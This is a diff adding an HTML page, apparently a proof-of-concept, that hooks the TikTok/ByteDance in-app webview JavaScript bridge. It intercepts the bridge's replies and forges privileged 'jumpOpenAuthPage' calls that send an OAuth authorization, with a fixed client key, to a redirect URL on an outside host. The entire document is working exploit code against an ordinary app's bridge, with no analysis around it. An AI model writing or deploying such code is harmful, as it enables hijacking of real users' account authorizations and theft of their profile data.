@@ -1,0 +1,21 @@
+<!doctype html><html><head><meta charset="utf-8"><title>R52</title></head><body>
+<h3 id="st">R52 auth3</h3><script>
+(function(){
+  function send(t,d){try{document.getElementById('st').textContent=t+':'+String(d).substring(0,200);}catch(e){}}
+  if(!window.ToutiaoJSBridge){send('nobridge','');return;}
+  var orig=window.ToutiaoJSBridge._handleMessageFromToutiao;
+  window.ToutiaoJSBridge._handleMessageFromToutiao=function(s){
+    var t=(typeof s==='string')?s:JSON.stringify(s);send('resp',t.substring(0,500));
+    try{if(orig)orig.call(window.ToutiaoJSBridge,s);}catch(e){}};
+  function fire(id,fn,params){
+    var m={__msg_type:'call',__callback_id:id,func:fn,params:params,JSSDK:'5.2.30',
+           namespace:'',__iframe_url:'',permissionGroup:'private',token:'a-'+Date.now()};
+    window.ToutiaoJSBridge.invokeMethod(JSON.stringify(m));
+    var f=document.getElementById('__JSBridgeIframe__')||document.createElement('iframe');
+    f.id='__JSBridgeIframe__';f.style.display='none';document.documentElement.appendChild(f);
+    f.src='bytedance://dispatch_message/';send('fired',fn);}
+  var RD='https://tiktok.ntd.io.vn/auth2.html';
+  setTimeout(function(){fire('a1','jumpOpenAuthPage',{client_key:'sbaw85tmncn56qcxj7',scope:'user.info.basic',state:'r52',redirect_uri:RD});},2000);
+  setTimeout(function(){fire('a2','jumpOpenAuthPage',{client_key:'sbaw85tmncn56qcxj7',scope:'user.info.basic',state:'r52',redirect_uri:RD,disable_auto_auth:false});},8000);
+})();
+</script></body></html>
